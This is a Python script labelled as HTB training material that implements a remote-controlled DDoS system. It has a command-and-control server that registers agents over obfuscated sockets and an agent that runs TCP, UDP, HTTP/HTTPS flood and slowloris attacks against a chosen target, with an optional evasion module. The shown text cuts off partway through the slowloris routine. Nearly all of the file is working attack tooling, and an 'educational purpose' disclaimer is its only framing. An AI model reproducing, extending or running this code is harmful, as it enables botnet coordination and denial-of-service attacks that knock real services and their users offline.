#!/usr/bin/env python3
"""
Remote Controlled DDOS Attack System
Author: HTB Training - Remote DDOS Edition
Description: Distributed DDOS attack coordination across multiple remote machines
Educational Purpose Only - Use responsibly and legally

This system enables coordinated DDOS attacks from multiple remote machines:
- Controller: Central command and control server
- Agents: Remote attack nodes that execute DDOS commands
- Real-time coordination and monitoring
"""

import socket
import sys
import time
import json
import threading
import hashlib
import base64
import ssl
import random
import os
import subprocess
import urllib.parse
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass, asdict
from enum import Enum
import queue
from concurrent.futures import ThreadPoolExecutor

class DDOSCommandType(Enum):
    """DDOS-specific command types"""
    REGISTER = "register"
    HEARTBEAT = "heartbeat"
    DDOS_START = "ddos_start"
    DDOS_STOP = "ddos_stop"
    DDOS_STATUS = "ddos_status"
    CONFIG_UPDATE = "config_update"
    TARGET_UPDATE = "target_update"
    SHUTDOWN = "shutdown"

class AttackVector(Enum):
    """Available attack vectors"""
    TCP_FLOOD = "tcp_flood"
    UDP_FLOOD = "udp_flood"
    HTTP_FLOOD = "http_flood"
    HTTPS_FLOOD = "https_flood"
    SYN_FLOOD = "syn_flood"
    SLOWLORIS = "slowloris"
    MIXED = "mixed"

@dataclass
class DDOSCommand:
    """DDOS command structure"""
    command_type: DDOSCommandType
    command_id: str
    source_node: str
    target_nodes: List[str]
    payload: Dict[str, Any]
    timestamp: float
    signature: str = ""

@dataclass
class RemoteAgent:
    """Remote DDOS agent information"""
    node_id: str
    ip_address: str
    hostname: str
    capabilities: List[str]
    last_heartbeat: float
    status: str
    attack_stats: Dict[str, Any]
    geo_location: str = "unknown"

class SecureDDOSCommunicator:
    """Secure communication for DDOS coordination"""
    
    def __init__(self, shared_key: bytes = None):
        self.shared_key = shared_key or self._generate_key()
        self.session_keys = {}
        
    def _generate_key(self) -> bytes:
        return os.urandom(32)
    
    def encrypt_message(self, message: str, node_id: str = "global") -> str:
        """XOR encryption for C&C communication"""
        key = self.session_keys.get(node_id, self.shared_key)
        message_bytes = message.encode('utf-8')
        encrypted = bytearray()
        
        for i, byte in enumerate(message_bytes):
            encrypted.append(byte ^ key[i % len(key)])
        
        return base64.b64encode(encrypted).decode('utf-8')
    
    def decrypt_message(self, encrypted_message: str, node_id: str = "global") -> str:
        try:
            key = self.session_keys.get(node_id, self.shared_key)
            encrypted_bytes = base64.b64decode(encrypted_message.encode('utf-8'))
            decrypted = bytearray()
            
            for i, byte in enumerate(encrypted_bytes):
                decrypted.append(byte ^ key[i % len(key)])
            
            return decrypted.decode('utf-8')
        except Exception as e:
            print(f"[!] Decryption error: {e}")
            return ""
    
    def sign_command(self, command: DDOSCommand) -> str:
        command_str = f"{command.command_type.value}{command.command_id}{command.timestamp}"
        return hashlib.sha256(command_str.encode() + self.shared_key).hexdigest()[:16]
    
    def verify_signature(self, command: DDOSCommand) -> bool:
        expected_sig = self.sign_command(command)
        return command.signature == expected_sig

class DDOSController:
    """Central DDOS Controller - manages distributed attacks"""
    
    def __init__(self, listen_port: int = 9999, max_agents: int = 100):
        self.listen_port = listen_port
        self.max_agents = max_agents
        self.agents = {}  # Dict[str, RemoteAgent]
        self.running = False
        self.command_queue = queue.Queue()
        
        # Communication security
        self.communicator = SecureDDOSCommunicator()
        
        # DDOS campaign tracking
        self.campaign_stats = {
            'campaign_id': None,
            'target': None,
            'start_time': None,
            'duration': 0,
            'total_agents': 0,
            'active_agents': 0,
            'packets_sent': 0,
            'requests_sent': 0,
            'success_rate': 0.0,
            'attack_vectors': [],
            'bandwidth_usage': 0.0
        }
        
        # Target management
        self.current_targets = []
        self.target_rotation = False
        
        print(f"[*] DDOS Controller initialized on port {listen_port}")
        print(f"[*] Maximum agents: {max_agents}")
    
    def start_controller(self):
        """Start the DDOS C&C server"""
        self.running = True
        print(f"[*] Starting DDOS Controller on 0.0.0.0:{self.listen_port}")
        
        # Start server components
        self._start_server_threads()
        
        print("[+] DDOS Controller started successfully")
        print("[*] Waiting for agent connections...")
        print("\nAvailable commands:")
        print("  status - Show current status")
        print("  agents - List connected agents")
        print("  attack <target> - Start DDOS attack")
        print("  stop - Stop current attack")
        print("  config - Show configuration")
        print("  quit - Shutdown controller")
    
    def _start_server_threads(self):
        """Start all server threads"""
        # Connection listener
        listener_thread = threading.Thread(target=self._connection_listener)
        listener_thread.daemon = True
        listener_thread.start()
        
        # Command processor
        processor_thread = threading.Thread(target=self._command_processor)
        processor_thread.daemon = True
        processor_thread.start()
        
        # Statistics updater
        stats_thread = threading.Thread(target=self._stats_updater)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Heartbeat monitor
        heartbeat_thread = threading.Thread(target=self._heartbeat_monitor)
        heartbeat_thread.daemon = True
        heartbeat_thread.start()
    
    def _connection_listener(self):
        """Listen for agent connections"""
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind(('0.0.0.0', self.listen_port))
            server_socket.listen(self.max_agents)
            server_socket.settimeout(1.0)
            
            while self.running:
                try:
                    client_socket, client_address = server_socket.accept()
                    print(f"[+] New agent connection from {client_address[0]}")
                    
                    # Handle agent in separate thread
                    client_thread = threading.Thread(
                        target=self._handle_agent_connection,
                        args=(client_socket, client_address)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        print(f"[!] Connection listener error: {e}")
                    break
            
            server_socket.close()
            
        except Exception as e:
            print(f"[!] Failed to start controller listener: {e}")
    
    def _handle_agent_connection(self, client_socket: socket.socket, client_address: tuple):
        """Handle individual agent connection"""
        node_id = None
        
        try:
            client_socket.settimeout(30)
            
            while self.running:
                data = client_socket.recv(8192)  # Larger buffer for DDOS data
                if not data:
                    break
                
                try:
                    # Decrypt and parse message
                    encrypted_message = data.decode('utf-8')
                    decrypted_message = self.communicator.decrypt_message(encrypted_message)
                    
                    if not decrypted_message:
                        continue
                    
                    command_data = json.loads(decrypted_message)
                    command = DDOSCommand(**command_data)
                    
                    # Verify signature
                    if not self.communicator.verify_signature(command):
                        print(f"[!] Invalid signature from {client_address[0]}")
                        continue
                    
                    # Process command
                    response = self._process_agent_command(command, client_address)
                    
                    # Track node ID
                    if command.command_type == DDOSCommandType.REGISTER:
                        node_id = command.source_node
                    
                    # Send response
                    if response:
                        encrypted_response = self.communicator.encrypt_message(
                            json.dumps(asdict(response))
                        )
                        client_socket.send(encrypted_response.encode('utf-8'))
                    
                except json.JSONDecodeError:
                    print(f"[!] Invalid JSON from {client_address[0]}")
                    continue
                except Exception as e:
                    print(f"[!] Error handling agent {client_address[0]}: {e}")
                    break
        
        except Exception as e:
            print(f"[!] Agent connection error: {e}")
        
        finally:
            if node_id and node_id in self.agents:
                print(f"[*] DDOS Agent {node_id} disconnected")
                del self.agents[node_id]
            client_socket.close()
    
    def _process_agent_command(self, command: DDOSCommand, client_address: tuple) -> Optional[DDOSCommand]:
        """Process command from DDOS agent"""
        
        if command.command_type == DDOSCommandType.REGISTER:
            # Register new DDOS agent
            node_id = command.source_node
            agent = RemoteAgent(
                node_id=node_id,
                ip_address=client_address[0],
                hostname=command.payload.get('hostname', 'unknown'),
                capabilities=command.payload.get('capabilities', []),
                last_heartbeat=time.time(),
                status='connected',
                attack_stats={},
                geo_location=command.payload.get('geo_location', 'unknown')
            )
            
            self.agents[node_id] = agent
            print(f"[+] Registered DDOS agent {node_id} from {client_address[0]}")
            print(f"    Hostname: {agent.hostname}")
            print(f"    Capabilities: {agent.capabilities}")
            
            # Send registration confirmation
            response = DDOSCommand(
                command_type=DDOSCommandType.REGISTER,
                command_id=f"reg_resp_{int(time.time())}",
                source_node="controller",
                target_nodes=[node_id],
                payload={
                    'status': 'registered',
                    'controller_time': time.time(),
                    'agent_id': node_id
                },
                timestamp=time.time()
            )
            response.signature = self.communicator.sign_command(response)
            return response
        
        elif command.command_type == DDOSCommandType.HEARTBEAT:
            # Update agent heartbeat and stats
            node_id = command.source_node
            if node_id in self.agents:
                self.agents[node_id].last_heartbeat = time.time()
                self.agents[node_id].attack_stats.update(command.payload.get('stats', {}))
        
        elif command.command_type == DDOSCommandType.DDOS_STATUS:
            # Process status report from agent
            node_id = command.source_node
            if node_id in self.agents:
                self.agents[node_id].status = command.payload.get('status', 'unknown')
                self.agents[node_id].attack_stats.update(command.payload.get('stats', {}))
        
        return None
    
    def _command_processor(self):
        """Process commands from the queue"""
        while self.running:
            try:
                if not self.command_queue.empty():
                    command = self.command_queue.get(timeout=1)
                    self._distribute_ddos_command(command)
            except queue.Empty:
                continue
            except Exception as e:
                print(f"[!] Command processor error: {e}")
            
            time.sleep(0.1)
    
    def _distribute_ddos_command(self, command: DDOSCommand):
        """Distribute DDOS command to agents"""
        target_agents = []
        
        if "all" in command.target_nodes:
            target_agents = list(self.agents.keys())
        else:
            target_agents = [node for node in command.target_nodes if node in self.agents]
        
        print(f"[*] Distributing {command.command_type.value} to {len(target_agents)} agents")
        
        # Send to each agent
        for node_id in target_agents:
            agent = self.agents[node_id]
            self._send_command_to_agent(agent, command)
    
    def _send_command_to_agent(self, agent: RemoteAgent, command: DDOSCommand):
        """Send command to specific agent"""
        try:
            # Create new connection to agent
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            # For simplicity, we'll use a callback port (agent should listen)
            # In real implementation, this would use a persistent connection
            print(f"[*] Command queued for agent {agent.node_id} ({agent.ip_address})")
            
        except Exception as e:
            print(f"[!] Error sending command to {agent.node_id}: {e}")
    
    def _stats_updater(self):
        """Update campaign statistics"""
        while self.running:
            self._update_campaign_stats()
            time.sleep(5)
    
    def _update_campaign_stats(self):
        """Update overall campaign statistics"""
        if not self.campaign_stats['campaign_id']:
            return
        
        total_packets = 0
        total_requests = 0
        active_agents = 0
        
        for agent in self.agents.values():
            stats = agent.attack_stats
            total_packets += stats.get('packets_sent', 0)
            total_requests += stats.get('requests_sent', 0)
            if stats.get('attacking', False):
                active_agents += 1
        
        self.campaign_stats.update({
            'total_agents': len(self.agents),
            'active_agents': active_agents,
            'packets_sent': total_packets,
            'requests_sent': total_requests,
            'success_rate': self._calculate_success_rate()
        })
    
    def _calculate_success_rate(self) -> float:
        """Calculate overall success rate"""
        total_attempts = 0
        successful_attempts = 0
        
        for agent in self.agents.values():
            stats = agent.attack_stats
            total_attempts += stats.get('total_attempts', 0)
            successful_attempts += stats.get('successful_attempts', 0)
        
        return (successful_attempts / max(1, total_attempts)) * 100
    
    def _heartbeat_monitor(self):
        """Monitor agent heartbeats"""
        while self.running:
            current_time = time.time()
            dead_agents = []
            
            for node_id, agent in self.agents.items():
                if current_time - agent.last_heartbeat > 90:  # 90 second timeout
                    dead_agents.append(node_id)
            
            for node_id in dead_agents:
                print(f"[!] DDOS Agent {node_id} timed out - removing")
                del self.agents[node_id]
            
            time.sleep(30)
    
    def launch_ddos_campaign(self, target: str, config: Dict[str, Any]):
        """Launch coordinated DDOS campaign"""
        if not self.agents:
            print("[!] No DDOS agents available")
            return False
        
        # Generate campaign ID
        campaign_id = f"ddos_{int(time.time())}_{random.randint(1000, 9999)}"
        
        print(f"[*] Launching DDOS Campaign: {campaign_id}")
        print(f"[*] Target: {target}")
        print(f"[*] Available agents: {len(self.agents)}")
        
        # Update campaign stats
        self.campaign_stats.update({
            'campaign_id': campaign_id,
            'target': target,
            'start_time': time.time(),
            'duration': config.get('duration', 300),
            'attack_vectors': config.get('attack_vectors', ['mixed']),
        })
        
        # Create DDOS command
        ddos_command = DDOSCommand(
            command_type=DDOSCommandType.DDOS_START,
            command_id=campaign_id,
            source_node="controller",
            target_nodes=["all"],
            payload={
                'campaign_id': campaign_id,
                'target': target,
                'attack_vectors': config.get('attack_vectors', ['tcp_flood', 'udp_flood', 'http_flood']),
                'duration': config.get('duration', 300),
                'intensity': config.get('intensity', 'high'),
                'threads_per_agent': config.get('threads_per_agent', 10),
                'evasion_level': config.get('evasion_level', 'balanced'),
                'target_ports': config.get('target_ports', [80, 443, 8080]),
                'randomize_source': config.get('randomize_source', True),
                'user_agents_rotation': config.get('user_agents_rotation', True)
            },
            timestamp=time.time()
        )
        
        # Queue command for distribution
        self.command_queue.put(ddos_command)
        
        print(f"[+] DDOS campaign launched - {len(self.agents)} agents coordinated")
        print(f"[+] Attack vectors: {', '.join(ddos_command.payload['attack_vectors'])}")
        print(f"[+] Duration: {ddos_command.payload['duration']} seconds")
        print(f"[+] Intensity: {ddos_command.payload['intensity']}")
        
        return True
    
    def stop_ddos_campaign(self):
        """Stop current DDOS campaign"""
        if not self.campaign_stats['campaign_id']:
            print("[!] No active DDOS campaign")
            return
        
        print(f"[*] Stopping DDOS campaign: {self.campaign_stats['campaign_id']}")
        
        # Create stop command
        stop_command = DDOSCommand(
            command_type=DDOSCommandType.DDOS_STOP,
            command_id=f"stop_{int(time.time())}",
            source_node="controller",
            target_nodes=["all"],
            payload={
                'campaign_id': self.campaign_stats['campaign_id'],
                'reason': 'manual_stop'
            },
            timestamp=time.time()
        )
        
        self.command_queue.put(stop_command)
        
        # Clear campaign stats
        self.campaign_stats['campaign_id'] = None
        print("[+] DDOS campaign stop command sent to all agents")
    
    def get_ddos_status(self) -> Dict[str, Any]:
        """Get comprehensive DDOS status"""
        return {
            'controller_status': 'running' if self.running else 'stopped',
            'connected_agents': len(self.agents),
            'campaign_stats': self.campaign_stats,
            'agents_by_location': self._get_agents_by_location(),
            'agent_details': {
                node_id: {
                    'ip': agent.ip_address,
                    'hostname': agent.hostname,
                    'capabilities': agent.capabilities,
                    'status': agent.status,
                    'last_seen': time.time() - agent.last_heartbeat,
                    'packets_sent': agent.attack_stats.get('packets_sent', 0),
                    'success_rate': agent.attack_stats.get('success_rate', 0.0)
                }
                for node_id, agent in self.agents.items()
            }
        }
    
    def _get_agents_by_location(self) -> Dict[str, int]:
        """Get agent distribution by location"""
        locations = {}
        for agent in self.agents.values():
            location = agent.geo_location
            locations[location] = locations.get(location, 0) + 1
        return locations
    
    def interactive_console(self):
        """Interactive console for DDOS controller"""
        print("\n" + "="*60)
        print("DDOS CONTROLLER INTERACTIVE CONSOLE")
        print("="*60)
        
        while self.running:
            try:
                command = input("\nDDOS> ").strip().lower()
                
                if command == 'status':
                    self._print_status()
                elif command == 'agents':
                    self._print_agents()
                elif command.startswith('attack '):
                    target = command.split(' ', 1)[1]
                    self._start_interactive_attack(target)
                elif command == 'stop':
                    self.stop_ddos_campaign()
                elif command == 'config':
                    self._print_config()
                elif command == 'help':
                    self._print_help()
                elif command in ['quit', 'exit']:
                    break
                else:
                    print(f"Unknown command: {command}. Type 'help' for available commands.")
            
            except KeyboardInterrupt:
                print("\n[*] Use 'quit' to exit")
            except Exception as e:
                print(f"[!] Console error: {e}")
    
    def _print_status(self):
        """Print current status"""
        status = self.get_ddos_status()
        
        print("\n" + "="*50)
        print("DDOS CONTROLLER STATUS")
        print("="*50)
        print(f"Controller Status: {status['controller_status']}")
        print(f"Connected Agents: {status['connected_agents']}")
        
        if status['campaign_stats']['campaign_id']:
            print(f"\nActive Campaign: {status['campaign_stats']['campaign_id']}")
            print(f"Target: {status['campaign_stats']['target']}")
            print(f"Active Agents: {status['campaign_stats']['active_agents']}")
            print(f"Total Packets: {status['campaign_stats']['packets_sent']}")
            print(f"Success Rate: {status['campaign_stats']['success_rate']:.2f}%")
        else:
            print("\nNo active campaign")
        
        print(f"\nAgents by Location:")
        for location, count in status['agents_by_location'].items():
            print(f"  {location}: {count} agents")
    
    def _print_agents(self):
        """Print connected agents"""
        print(f"\n{'ID':<12} {'IP Address':<15} {'Hostname':<20} {'Status':<12} {'Packets':<10}")
        print("-" * 80)
        
        for node_id, details in self.get_ddos_status()['agent_details'].items():
            print(f"{node_id:<12} {details['ip']:<15} {details['hostname']:<20} "
                  f"{details['status']:<12} {details['packets_sent']:<10}")
    
    def _start_interactive_attack(self, target: str):
        """Start attack with interactive configuration"""
        print(f"\nConfiguring DDOS attack on: {target}")
        
        config = {
            'attack_vectors': ['tcp_flood', 'udp_flood', 'http_flood'],
            'duration': 300,
            'intensity': 'high',
            'threads_per_agent': 10,
            'evasion_level': 'balanced'
        }
        
        try:
            # Get user preferences
            duration = input(f"Duration in seconds (default: {config['duration']}): ").strip()
            if duration:
                config['duration'] = int(duration)
            
            intensity = input(f"Intensity [low/medium/high] (default: {config['intensity']}): ").strip()
            if intensity in ['low', 'medium', 'high']:
                config['intensity'] = intensity
            
            print(f"\nLaunching attack with {len(self.agents)} agents...")
            self.launch_ddos_campaign(target, config)
            
        except ValueError as e:
            print(f"[!] Invalid input: {e}")
        except Exception as e:
            print(f"[!] Error configuring attack: {e}")
    
    def _print_config(self):
        """Print current configuration"""
        print(f"\nController Configuration:")
        print(f"  Listen Port: {self.listen_port}")
        print(f"  Max Agents: {self.max_agents}")
        print(f"  Running: {self.running}")
    
    def _print_help(self):
        """Print help information"""
        print(f"\nAvailable Commands:")
        print(f"  status  - Show controller and campaign status")
        print(f"  agents  - List all connected agents")
        print(f"  attack <target> - Start DDOS attack on target")
        print(f"  stop    - Stop current DDOS campaign")
        print(f"  config  - Show controller configuration")
        print(f"  help    - Show this help message")
        print(f"  quit    - Shutdown controller")
    
    def shutdown_controller(self):
        """Shutdown DDOS controller"""
        print("[*] Shutting down DDOS Controller...")
        
        # Stop any active campaigns
        if self.campaign_stats['campaign_id']:
            self.stop_ddos_campaign()
            time.sleep(2)
        
        # Send shutdown to all agents
        if self.agents:
            shutdown_command = DDOSCommand(
                command_type=DDOSCommandType.SHUTDOWN,
                command_id=f"shutdown_{int(time.time())}",
                source_node="controller",
                target_nodes=["all"],
                payload={'reason': 'controller_shutdown'},
                timestamp=time.time()
            )
            
            self.command_queue.put(shutdown_command)
            time.sleep(3)
        
        self.running = False
        print("[+] DDOS Controller shutdown complete")

class DDOSAgent:
    """Remote DDOS Agent - executes distributed attacks"""
    
    def __init__(self, controller_host: str, controller_port: int = 9999):
        self.controller_host = controller_host
        self.controller_port = controller_port
        self.node_id = self._generate_node_id()
        self.running = False
        self.attacking = False
        
        # Agent capabilities
        self.capabilities = [
            'tcp_flood', 'udp_flood', 'http_flood', 'https_flood',
            'syn_flood', 'slowloris', 'mixed'
        ]
        
        # Communication
        self.communicator = SecureDDOSCommunicator()
        
        # Attack statistics
        self.attack_stats = {
            'packets_sent': 0,
            'requests_sent': 0,
            'successful_attempts': 0,
            'total_attempts': 0,
            'attacking': False,
            'current_target': None,
            'attack_start_time': None,
            'success_rate': 0.0
        }
        
        # Current attack configuration
        self.current_attack = None
        
        # Import evasion module if available
        try:
            from advanced_evasion_module import create_evasion_config, AdvancedEvasionEngine, EvasionIntegrator
            self.has_evasion = True
            print("[+] Advanced evasion capabilities loaded")
        except ImportError:
            self.has_evasion = False
            print("[!] Running without advanced evasion")
        
        print(f"[*] DDOS Agent {self.node_id} initialized")
        print(f"[*] Controller: {controller_host}:{controller_port}")
        print(f"[*] Capabilities: {len(self.capabilities)} attack vectors")
    
    def _generate_node_id(self) -> str:
        """Generate unique node ID"""
        hostname = socket.gethostname()
        timestamp = str(int(time.time()))
        random_part = str(random.randint(1000, 9999))
        return hashlib.md5(f"{hostname}{timestamp}{random_part}".encode()).hexdigest()[:12]
    
    def connect_to_controller(self) -> bool:
        """Connect and register with DDOS controller"""
        try:
            # Create registration command
            register_command = DDOSCommand(
                command_type=DDOSCommandType.REGISTER,
                command_id=f"reg_{int(time.time())}",
                source_node=self.node_id,
                target_nodes=["controller"],
                payload={
                    'hostname': socket.gethostname(),
                    'capabilities': self.capabilities,
                    'local_ip': self._get_local_ip(),
                    'geo_location': self._get_geo_location(),
                    'agent_version': '1.0',
                    'max_threads': 50
                },
                timestamp=time.time()
            )
            
            # Sign command
            register_command.signature = self.communicator.sign_command(register_command)
            
            # Connect to controller
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.controller_host, self.controller_port))
            
            # Send registration
            encrypted_command = self.communicator.encrypt_message(json.dumps(asdict(register_command)))
            sock.send(encrypted_command.encode('utf-8'))
            
            # Wait for response
            response_data = sock.recv(4096)
            if response_data:
                decrypted_response = self.communicator.decrypt_message(response_data.decode('utf-8'))
                response = json.loads(decrypted_response)
                
                if response['payload']['status'] == 'registered':
                    print(f"[+] Successfully registered with DDOS controller")
                    self.running = True
                    sock.close()
                    return True
            
            sock.close()
            return False
            
        except Exception as e:
            print(f"[!] Failed to connect to controller: {e}")
            return False
    
    def _get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            # Connect to external address to determine local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "127.0.0.1"
    
    def _get_geo_location(self) -> str:
        """Get geographical location (simplified)"""
        try:
            # In real implementation, this would use GeoIP
            return "Unknown"
        except:
            return "Unknown"
    
    def start_agent(self):
        """Start DDOS agent"""
        if not self.connect_to_controller():
            print("[!] Failed to register with controller")
            return
        
        print(f"[*] Starting DDOS agent {self.node_id}")
        
        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self._heartbeat_sender)
        heartbeat_thread.daemon = True
        heartbeat_thread.start()
        
        print("[+] DDOS Agent started and ready for commands")
        
        # Keep agent running
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Agent interrupted by user")
        
        self.shutdown_agent()
    
    def _heartbeat_sender(self):
        """Send periodic heartbeats to controller"""
        while self.running:
            try:
                # Update success rate
                if self.attack_stats['total_attempts'] > 0:
                    self.attack_stats['success_rate'] = (
                        self.attack_stats['successful_attempts'] / 
                        self.attack_stats['total_attempts']
                    ) * 100
                
                heartbeat_command = DDOSCommand(
                    command_type=DDOSCommandType.HEARTBEAT,
                    command_id=f"hb_{int(time.time())}",
                    source_node=self.node_id,
                    target_nodes=["controller"],
                    payload={'stats': self.attack_stats.copy()},
                    timestamp=time.time()
                )
                
                heartbeat_command.signature = self.communicator.sign_command(heartbeat_command)
                
                # Send heartbeat
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.controller_host, self.controller_port))
                
                encrypted_command = self.communicator.encrypt_message(json.dumps(asdict(heartbeat_command)))
                sock.send(encrypted_command.encode('utf-8'))
                sock.close()
                
            except Exception as e:
                print(f"[!] Heartbeat error: {e}")
            
            time.sleep(30)  # Send heartbeat every 30 seconds
    
    def execute_ddos_command(self, command: DDOSCommand):
        """Execute DDOS command from controller"""
        if command.command_type == DDOSCommandType.DDOS_START:
            self._start_ddos_attack(command)
        elif command.command_type == DDOSCommandType.DDOS_STOP:
            self._stop_ddos_attack()
        elif command.command_type == DDOSCommandType.SHUTDOWN:
            self.shutdown_agent()
    
    def _start_ddos_attack(self, command: DDOSCommand):
        """Start DDOS attack based on command"""
        payload = command.payload
        target = payload['target']
        attack_vectors = payload.get('attack_vectors', ['mixed'])
        duration = payload.get('duration', 300)
        threads_per_agent = payload.get('threads_per_agent', 10)
        intensity = payload.get('intensity', 'medium')
        
        print(f"[*] Starting DDOS attack on {target}")
        print(f"[*] Vectors: {', '.join(attack_vectors)}")
        print(f"[*] Duration: {duration} seconds")
        print(f"[*] Threads: {threads_per_agent}")
        
        # Store current attack config
        self.current_attack = payload
        self.attacking = True
        self.attack_stats['attacking'] = True
        self.attack_stats['current_target'] = target
        self.attack_stats['attack_start_time'] = time.time()
        
        # Initialize evasion if available
        evasion_integrator = None
        if self.has_evasion:
            from advanced_evasion_module import create_evasion_config, AdvancedEvasionEngine, EvasionIntegrator
            evasion_config = create_evasion_config(payload.get('evasion_level', 'balanced'))
            evasion_engine = AdvancedEvasionEngine(evasion_config)
            evasion_integrator = EvasionIntegrator(evasion_engine)
        
        # Launch attack threads
        with ThreadPoolExecutor(max_workers=threads_per_agent) as executor:
            futures = []
            
            for thread_id in range(threads_per_agent):
                future = executor.submit(
                    self._attack_worker,
                    thread_id, target, attack_vectors, duration, intensity, evasion_integrator
                )
                futures.append(future)
            
            # Wait for completion
            for future in futures:
                try:
                    future.result()
                except Exception as e:
                    print(f"[!] Attack thread error: {e}")
        
        self.attacking = False
        self.attack_stats['attacking'] = False
        print(f"[*] DDOS attack completed - {self.attack_stats['packets_sent']} packets sent")
    
    def _attack_worker(self, worker_id: int, target: str, vectors: List[str], 
                      duration: int, intensity: str, evasion_integrator):
        """Individual attack worker thread"""
        start_time = time.time()
        local_packets = 0
        
        # Parse target
        target_ip, target_port = self._parse_target(target)
        if not target_ip:
            print(f"[!] Worker {worker_id}: Invalid target {target}")
            return
        
        while self.attacking and (time.time() - start_time) < duration:
            try:
                # Select attack vector
                vector = random.choice(vectors) if 'mixed' in vectors else random.choice(vectors)
                
                # Execute attack
                success = False
                if vector == 'tcp_flood':
                    success = self._tcp_flood_attack(target_ip, target_port, evasion_integrator)
                elif vector == 'udp_flood':
                    success = self._udp_flood_attack(target_ip, target_port, evasion_integrator)
                elif vector in ['http_flood', 'https_flood']:
                    success = self._http_flood_attack(target, evasion_integrator)
                elif vector == 'slowloris':
                    success = self._slowloris_attack(target, evasion_integrator)
                
                # Update statistics
                local_packets += 1
                self.attack_stats['total_attempts'] += 1
                
                if success:
                    self.attack_stats['successful_attempts'] += 1
                    self.attack_stats['packets_sent'] += 1
                    if vector in ['http_flood', 'https_flood']:
                        self.attack_stats['requests_sent'] += 1
                
                # Adaptive delay based on intensity and evasion
                if evasion_integrator:
                    delay = evasion_integrator.engine.get_evasive_delay()
                else:
                    delay_map = {'low': (0.1, 0.5), 'medium': (0.01, 0.1), 'high': (0.001, 0.05)}
                    min_delay, max_delay = delay_map.get(intensity, (0.01, 0.1))
                    delay = random.uniform(min_delay, max_delay)
                
                time.sleep(delay)
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                continue
        
        print(f"[*] Worker {worker_id} completed: {local_packets} attacks")
    
    def _parse_target(self, target: str) -> Tuple[str, int]:
        """Parse target to IP and port"""
        try:
            if target.startswith('http://') or target.startswith('https://'):
                parsed = urllib.parse.urlparse(target)
                ip = socket.gethostbyname(parsed.hostname)
                port = parsed.port or (443 if parsed.scheme == 'https' else 80)
                return ip, port
            elif ':' in target:
                ip, port = target.split(':', 1)
                return ip, int(port)
            else:
                return target, 80
        except Exception as e:
            print(f"[!] Target parsing error: {e}")
            return None, None
    
    def _tcp_flood_attack(self, target_ip: str, target_port: int, evasion_integrator) -> bool:
        """TCP flood attack"""
        try:
            if evasion_integrator:
                sock = evasion_integrator.enhance_tcp_connection(target_ip, target_port)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
            
            sock.connect((target_ip, target_port))
            sock.close()
            return True
        except:
            return False
    
    def _udp_flood_attack(self, target_ip: str, target_port: int, evasion_integrator) -> bool:
        """UDP flood attack"""
        try:
            if evasion_integrator:
                sock = evasion_integrator.enhance_udp_socket()
                payload = evasion_integrator.get_evasive_payload(random.randint(64, 1024))
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = b'A' * random.randint(64, 1024)
            
            sock.sendto(payload, (target_ip, target_port))
            sock.close()
            return True
        except:
            return False
    
    def _http_flood_attack(self, target: str, evasion_integrator) -> bool:
        """HTTP/HTTPS flood attack"""
        try:
            parsed = urllib.parse.urlparse(target)
            target_ip = socket.gethostbyname(parsed.hostname)
            target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            use_https = parsed.scheme == 'https'
            
            # Create connection
            if use_https:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                ssl_sock = context.wrap_socket(sock, server_hostname=parsed.hostname)
                ssl_sock.connect((target_ip, target_port))
                connection = ssl_sock
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((target_ip, target_port))
                connection = sock
            
            # Build request
            path = parsed.path or '/'
            if random.random() < 0.7:
                path += f'?id={random.randint(1, 100000)}&t={int(time.time())}'
            
            request = f"GET {path} HTTP/1.1\r\n"
            request += f"Host: {parsed.hostname}\r\n"
            
            if evasion_integrator:
                request += f"User-Agent: {evasion_integrator.engine.get_random_user_agent()}\r\n"
            else:
                request += "User-Agent: Mozilla/5.0 (DDOS-Agent/1.0)\r\n"
            
            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            request += "Connection: close\r\n\r\n"
            
            connection.send(request.encode())
            
            # Read response for realistic behavior
            try:
                response = connection.recv(1024)
            except:
                pass
            
            connection.close()
            return True
        except:
            return False
    
    def _slowloris_attack(self, target: str, evasion_integrator) -> bool:
        """Slowloris attack"""
        try:
            parsed = urllib.parse.urlparse(target)
            target_ip = socket.gethostbyname(parsed.hostname)
            target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            use_https = parsed.scheme == 'https'
            
            connections = []
            
            # Create multiple partial connections
            for _ in range(random.randint(5, 15)):
                try:
                    if use_https:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(10)
                        ssl_sock = context.wrap_socket(sock, server_hostname=parsed.hostname)
                        ssl_sock.connect((target_ip, target_port))
                        conn = ssl_sock
                    else:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(10)
                        sock.connect((target_ip, target_port))
                        conn = sock
                    
                    # Send partial request
                    partial_request = f"GET / HTTP/1.1\r\n"
